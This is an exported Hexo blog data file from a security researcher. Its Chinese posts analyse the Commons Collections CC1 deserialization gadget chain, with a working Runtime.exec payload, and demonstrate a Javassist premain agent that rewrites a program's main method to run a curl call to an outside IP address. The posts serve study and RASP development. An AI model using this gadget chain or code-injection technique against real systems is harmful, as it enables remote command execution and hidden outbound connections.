{"meta":{"title":"l1m3's blog","subtitle":"","description":"","author":"l1m3@syclover","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2020-10-13T14:47:42.571Z","updated":"2020-10-13T14:47:42.571Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2020-10-13T14:48:19.894Z","updated":"2020-10-13T14:48:19.894Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2020-10-20T14:02:08.000Z","updated":"2020-11-13T10:13:29.934Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"syclover饮水机管理员前长亭科技安全服务工程师22届本科生 找实习ing&#49;&#x31;&#x6d;&#x33;&#49;&#48;&#x36;&#x32;&#57;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#x63;&#111;&#x6d;"}],"posts":[{"title":"CC链1的初次调试","slug":"CC链1的初次调试","date":"2020-11-13T17:43:57.000Z","updated":"2020-11-13T17:51:28.276Z","comments":true,"path":"2020/11/14/CC链1的初次调试/","link":"","permalink":"http://example.com/2020/11/14/CC%E9%93%BE1%E7%9A%84%E5%88%9D%E6%AC%A1%E8%B0%83%E8%AF%95/","excerpt":"","text":"CC链1的初次调试Weblogic环境搭建 参考刘师傅的博客搭建的 教程 java动态代理要约王美丽不能直接约，要通过她的家人。王美丽实现约会功能，家人负责加强约会前后的处理。 1234567package Dynamic;public interface Girl &#123; void date(); void watchMovie();&#125; 123456789101112package Dynamic;public class Longlone &#123; public static void main(String[] args)&#123; Girl girl = new WangMeiLi(); WangMeiLiProxy family = new WangMeiLiProxy(girl); Girl mother = (Girl)family.getProxyInstance(); //girl.date(); mother.date(); &#125;&#125; 123456789101112package Dynamic;public class WangMeiLi implements Girl &#123; @Override public void date()&#123; System.out.println(&quot;和王美丽约会&quot;); &#125; @Override public void watchMovie()&#123; System.out.println(&quot;和王美丽看电影&quot;); &#125;&#125; 123456789101112131415161718192021222324252627282930package Dynamic;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class WangMeiLiProxy implements InvocationHandler&#123; private Girl girl; public WangMeiLiProxy(Girl girl)&#123; super(); this.girl = girl; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable&#123; doSomethingBefore(); Object ret = method.invoke(girl,args); doSomethingEnd(); return ret; &#125; private void doSomethingBefore()&#123; System.out.println(&quot;你帅不帅&quot;); &#125; private void doSomethingEnd()&#123; System.out.println(&quot;下次还来吗&quot;); &#125; public Object getProxyInstance()&#123; return Proxy.newProxyInstance(girl.getClass().getClassLoader(),girl.getClass().getInterfaces(),this); &#125;&#125; 在CC1链里面，最重要的接口是transformer，我们要利用的其他类都是它的动态代理 调试过程这里直接用脚本打过去，开启远程调试对docker里面的weblogic调试，在InvokerTransformer#transform处下断点 InvokerTransformer.class1234567891011121314151617181920212223public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args;&#125;public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, var7); &#125; &#125;&#125; ConstantTransformer.class ChainedTransformer.class payload分析1234567891011121314151617181920package Dynamic;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.*;public class cc1 &#123; public static void main(String[] args)&#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;); chain.transform(&quot;l1m3@syc&quot;); &#125;&#125; 1.第一步首先new了一个ChainedTransformer对象，传入了Transformer数组,内容分别为:1.new ConstantTransformer(Runtime.class)2.new InvokerTransformer(“getMethod”, new Class[] { String.class, Class[].class }, new Object[] { “getRuntime”, new Class[0] })3.new InvokerTransformer(“invoke”, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] })4.new InvokerTransformer(“exec”, new Class[] { String.class }, new Object[]{“open /System/Applications/Calculator.app”}) 2.第二步调用了自己的transform，传入(“l1m3@syc”)调用ConstantTransformer#transform(Runtime.class)然后调用InvokerTransformer#transform(java.lang.Runtime)61直接return xx.invoke(java.lang.Runtime,getRuntime),熟悉反射的师傅就知道了这里已经成功一大半了。这里获取到了getRuntime()方法下一个循环调用InvokerTransformer#transform(java.lang.Runtime.getRuntime)同样的这里执行了getRuntime()方法，获得了一个Runtime对象最后获取到了Runtime.exec()并且执行了我们的”open /System/Applications/Calculator.app” 总结感觉CC链1是比较简单的，没有做任何过滤，关键在于ChainedTransformer的链式处理，我们可以通过在InvokerTransformer#transform里面的反射调用获取到我们想要的类和方法，最终导致命令执行。 参考链接1.https://www.bilibili.com/video/BV1Dt41187wj?from=search&amp;seid=27181787029544237922.https://xz.aliyun.com/t/136","categories":[],"tags":[]},{"title":"初识Javassist-修改函数内容","slug":"初识Javassist-修改函数内容","date":"2020-11-13T09:38:41.000Z","updated":"2020-11-13T09:38:54.767Z","comments":true,"path":"2020/11/13/初识Javassist-修改函数内容/","link":"","permalink":"http://example.com/2020/11/13/%E5%88%9D%E8%AF%86Javassist-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E5%86%85%E5%AE%B9/","excerpt":"","text":"初识Javassist-修改函数内容前言 上一篇文章我们能够在main函数之前加载premain函数了，那么我们是否可以利用这个特性来对函数内容进行修改呢 实现1234567891011public class Test &#123; public static void main(String[] args)&#123; System.out.println(&quot;test123&quot;); new Sayhello().sayhello(); &#125; public void doSomething()&#123; System.out.println(&quot;do Something test&quot;); &#125;&#125; 123456public class Sayhello &#123; public void sayhello()&#123; System.out.println(&quot;hello&quot;); &#125;&#125; 正常运行效果那么假如攻击者要利用main函数里面的某些逻辑实现攻击,我们就可以在执行main函数之前修改main函数的内容 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.l1m3.premainagent.demo;import javassist.*;import java.io.IOException;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.Instrumentation;import java.lang.instrument.IllegalClassFormatException;import java.lang.instrument.Instrumentation;import java.security.ProtectionDomain;public class PremainAgent &#123; public static void premain(String arg, Instrumentation instrumentation) &#123; System.err.println(&quot;agent startup , args is &quot; + arg); Class&lt;?&gt;[] cLasses = instrumentation.getAllLoadedClasses(); for (Class&lt;?&gt; cls : cLasses) &#123; //System.out.println(&quot;PreMainAgent get loaded class:&quot; + cls.getName()); &#125; instrumentation.addTransformer(new ClassFileTransformer() &#123; public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123; if (className!=null&amp;&amp;className.replaceAll(&quot;/&quot;, &quot;.&quot;).equals(&quot;Test&quot;) )&#123; ClassPool pool = new ClassPool(); pool.insertClassPath(new LoaderClassPath(loader)); try &#123; System.out.println(&quot;执行 增加函数&quot;); CtClass ctClass = pool.get(className.replaceAll(&quot;/&quot;, &quot;\\\\.&quot;)); CtMethod ctMethod = ctClass.getDeclaredMethod(&quot;main&quot;); CtMethod[] arrays = ctClass.getDeclaredMethods(); for(int i=0;i&lt;arrays.length;i++) &#123; System.out.println(arrays[i]); &#125; ctMethod.setBody(&quot;&#123;\\n&quot; + &quot; Runtime runtime = Runtime.getRuntime();\\n&quot; + &quot; runtime.exec(\\&quot;curl 120.79.197.4:82\\&quot;);\\n&quot; + &quot; &#125;&quot;); ctMethod.insertBefore(&quot;System.out.println(System.currentTimeMillis());&quot;); return ctClass.toBytecode(); &#125; catch (NotFoundException e) &#123; e.printStackTrace(); &#125; catch (CannotCompileException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; return null; &#125; &#125;); &#125;&#125; 设置vmoption后执行，效果如下当然这一切都是为了将来想自己写的小型RASP作准备的，针对不同的漏洞hook不同的类/方法，如何处理函数，以及后续升级都是一段很长的路，简单看过OPENRASP后发现他是利用js来加规则的，我觉得这个特性很有亮点。","categories":[],"tags":[]},{"title":"premain的简单实现","slug":"JavaRASP的简单实现-一","date":"2020-11-01T07:48:15.000Z","updated":"2020-11-01T09:13:48.920Z","comments":true,"path":"2020/11/01/JavaRASP的简单实现-一/","link":"","permalink":"http://example.com/2020/11/01/JavaRASP%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0-%E4%B8%80/","excerpt":"","text":"Premain的简单实现前言最近对RASP较感兴趣，和我的开发同学@XXXFREDYANG一起搭搭环境，实现一下小demo 前置知识：AgentAgent 在JDK1.5以后，我们可以使用agent技术构建一个独立于应用程序的代理程序（即为Agent），用来协助监测、运行甚至替换其他JVM上的程序。使用它可以实现虚拟机级别的AOP功能。 Javaagent是java命令的一个参数。参数 javaagent 可以用于指定一个 jar 包，并且对该 java 包有2个要求：1.这个 jar 包的 MANIFEST.MF 文件必须指定 Premain-Class 项。2.Premain-Class 指定的那个类必须实现 premain() 方法。premain 方法，从字面上理解，就是运行在 main 函数之前的的类。当Java 虚拟机启动时，在执行 main 函数之前，JVM 会先运行-javaagent所指定 jar 包内 Premain-Class 这个类的 premain 方法 。在命令行输入 java可以看到相应的参数，其中有 和 java agent相关的： Attach机制jvm提供一种jvm进程间通信的能力，能让一个进程传命令给另外一个进程，并让它执行内部的一些操作，比如说我们为了让另外一个jvm进程把线程dump出来，那么我们跑了一个jstack的进程，然后传了个pid的参数，告诉它要哪个进程进行线程dump，既然是两个进程，那肯定涉及到进程间通信，以及传输协议的定义，比如要执行什么操作，传了什么参数等。这里用到的机制就是attach机制，它可以将JVM A连接至JVM B，并发送指令给JVM B执行，JDK自带常用工具如jstack，jps等就是使用该机制来实现的。这里我们先用tomcat启动一个程序用作主程序B，再来写A程序代码 MANIFEST.MF文件MANIFEST.MF文件用于描述Jar包的信息，例如指定入口函数等。我们需要在该文件中加入如下配置，指定我们编写的含有premain方法类的全路径，然后将agent类打成Jar包。 1/Users/nuc/IdeaProjects/javaAgent/resources/META-INF/MANIFEST.MF 当然这里我们用不到，因为我的jar包是直接用maven打包的 实现步骤1.写agent文件PremainAgent.java 123456789package com.l1m3.premainagent.demo;import java.lang.instrument.Instrumentation;public class PremainAgent &#123; public static void premain(String arg, Instrumentation instrumentation) &#123; System.err.println(&quot;agent startup , args is &quot; + arg); &#125;&#125; pom.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.3.5.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.l1m3.premainAgent&lt;/groupId&gt; &lt;artifactId&gt;demo&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;premainAgent&lt;/name&gt; &lt;description&gt;premainAgent&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt; &lt;artifactId&gt;junit-jupiter-api&lt;/artifactId&gt; &lt;version&gt;5.5.0&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.junit.vintage&lt;/groupId&gt; &lt;artifactId&gt;junit-vintage-engine&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.4.2&lt;/version&gt; &lt;configuration&gt; &lt;skipTests&gt;true&lt;/skipTests&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;configuration&gt; &lt;archive&gt; &lt;manifest&gt; &lt;addClasspath&gt;true&lt;/addClasspath&gt; &lt;/manifest&gt; &lt;manifestEntries&gt; &lt;Premain-Class&gt;com.l1m3.premainagent.demo.PremainAgent&lt;/Premain-Class&gt; &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt; &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt; &lt;/manifestEntries&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 重点在于： 这里是你实现premain函数的类使用maven打包路径为/Users/nuc/IdeaProjects/premainAgent/target/demo-0.0.1-SNAPSHOT.jar 2.写main函数测试MainFuncTestApplication.java 1234567package com.l1m3.mainfunctest.main;public class MainFuncTestApplication&#123; public static void main(String[] args)&#123; System.out.println(&quot;this is main function&quot;); &#125;&#125; 3.测试这里直接在IDEA里面使用vm option来设置agent，当然命令行参数也可以 -javaagent:/Users/nuc/IdeaProjects/premainAgent/target/demo-0.0.1-SNAPSHOT.jar 输出结果到此为止就实现了premain函数。","categories":[],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"http://example.com/tags/JAVA/"}]},{"title":"about","slug":"about","date":"2020-10-20T14:00:36.000Z","updated":"2020-10-20T14:01:18.202Z","comments":true,"path":"2020/10/20/about/","link":"","permalink":"http://example.com/2020/10/20/about/","excerpt":"","text":"syclover打工人web菜鸡","categories":[],"tags":[]},{"title":"博客搭建","slug":"博客搭建","date":"2020-10-19T07:38:07.000Z","updated":"2020-10-24T02:08:29.366Z","comments":true,"path":"2020/10/19/博客搭建/","link":"","permalink":"http://example.com/2020/10/19/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","excerpt":"","text":"创建仓库github用户名+github.io 生成ssh密钥对 上传公钥到githubhttps://github.com/settings/keys 安装nodebrew install node 安装hexonpm install -g hexo-clihexo init blogcd blognpm install 选择主题放主题文件到themes下配置.config.yml文件https://gitee.com/iamjerryw/hexo-theme-butterfly 启动hexohexo server博客在本地4000端口开启","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"http://example.com/tags/JAVA/"}]}